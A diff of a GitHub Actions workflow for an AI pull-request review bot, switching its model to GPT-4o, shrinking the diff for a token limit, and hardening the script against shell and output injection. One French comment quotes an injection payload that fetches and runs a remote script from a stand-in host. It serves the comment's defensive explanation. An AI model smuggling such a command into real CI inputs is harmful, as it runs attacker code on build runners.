@@ -29,27 +29,50 @@ jobs:
         with:
           fetch-depth: 0
 
+      # Budget de requête : GitHub Models plafonne gpt-4o à 8000 tokens de corps de
+      # requête (`413 Request body too large`). Un diff est dense (~3 caractères par
+      # token) : les 30000 caractères d'origine pesaient ~10000 tokens à eux seuls, donc
+      # le bot échouait sur TOUTE PR un peu grosse — silencieusement inutile là où il
+      # servait le plus. Enveloppe visée ≈ 4800 tokens, avec de la marge.
+      #
+      # PR_BODY passe par l'ENV, jamais par une interpolation `${{ }}` dans le script :
+      # un corps de PR contenant `"; curl evil.sh | sh #` serait sinon exécuté sur le
+      # runner (script injection — le corps de PR est une entrée non fiable).
       - name: Compute diff
         id: diff
+        env:
+          PR_BODY: ${{ github.event.pull_request.body }}
+          BASE_REF: ${{ github.event.pull_request.base.ref }}
         run: |
-          git fetch origin ${{ github.event.pull_request.base.ref }}
-          STAT=$(git diff origin/${{ github.event.pull_request.base.ref }}...HEAD --stat | head -50)
-          # Truncate full diff to 30K chars to fit free-tier context
-          FULL=$(git diff origin/${{ github.event.pull_request.base.ref }}...HEAD | head -c 30000)
+          git fetch origin "$BASE_REF"
+          STAT=$(git diff "origin/$BASE_REF...HEAD" --stat | head -30)
+          FULL=$(git diff "origin/$BASE_REF...HEAD" | head -c 10000)
+          BODY=$(printf '%s' "$PR_BODY" | head -c 1500)
+          # Délimiteur aléatoire, pas un mot fixe : STAT/FULL/BODY viennent du diff et
+          # du corps de la PR, tous deux contrôlés par l'auteur (fork PR). Un délimiteur
+          # constant permettrait d'injecter une ligne qui lui est identique dans le
+          # diff/corps pour clore le bloc en avance et faire passer les lignes
+          # suivantes pour de nouvelles affectations de sortie d'étape (output
+          # injection). Générer un délimiteur imprévisible à chaque run neutralise
+          # cette classe de bug. Ne pas revenir à un mot fixe pour "simplifier".
+          DELIM="ghout_$(openssl rand -hex 16)"
           {
-            echo "stat<<EOF"
+            echo "stat<<$DELIM"
             echo "$STAT"
-            echo "EOF"
-            echo "full<<EOF"
+            echo "$DELIM"
+            echo "full<<$DELIM"
             echo "$FULL"
-            echo "EOF"
-          } >> $GITHUB_OUTPUT
+            echo "$DELIM"
+            echo "body<<$DELIM"
+            echo "$BODY"
+            echo "$DELIM"
+          } >> "$GITHUB_OUTPUT"
 
-      - name: Run AI inference (Claude 3.5 Sonnet)
+      - name: Run AI inference (GPT-4o)
         id: ai
         uses: actions/ai-inference@v1
         with:
-          model: anthropic/claude-3-5-sonnet
+          model: openai/gpt-4o
           max-tokens: 1500
           system-prompt: |
             You are a senior reviewer for the Facil Framework — a generic deployable platform for digital services (gov, enterprise, SaaS, banking) built on FastAPI + Next.js + Expo + Postgres+pgvector + Ollama. The framework is in pre-bootstrap state. Be constructive but rigorous.
@@ -76,7 +99,7 @@ jobs:
             PR title: ${{ github.event.pull_request.title }}
 
             PR body:
-            ${{ github.event.pull_request.body }}
+            ${{ steps.diff.outputs.body }}
 
             Diff stat:
             ${{ steps.diff.outputs.stat }}
@@ -91,7 +114,7 @@ jobs:
         with:
           script: |
             const review = process.env.REVIEW || '_AI inference returned empty._';
-            const body = `<img src="https://raw.githubusercontent.com/${context.repo.owner}/${context.repo.repo}/main/.github/assets/icons/bot.svg" width="14" alt="bot"/> &nbsp;**PR Review** · GitHub Models · Claude 3.5 Sonnet\n\n---\n\n${review}\n\n---\n_Auto-generated. Add label \`skip-review\` to opt out._`;
+            const body = `<img src="https://raw.githubusercontent.com/${context.repo.owner}/${context.repo.repo}/main/.github/assets/icons/bot.svg" width="14" alt="bot"/> &nbsp;**PR Review** · GitHub Models · GPT-4o\n\n---\n\n${review}\n\n---\n_Auto-generated. Add label \`skip-review\` to opt out._`;
             await github.rest.issues.createComment({
               owner: context.repo.owner,
               repo: context.repo.repo,
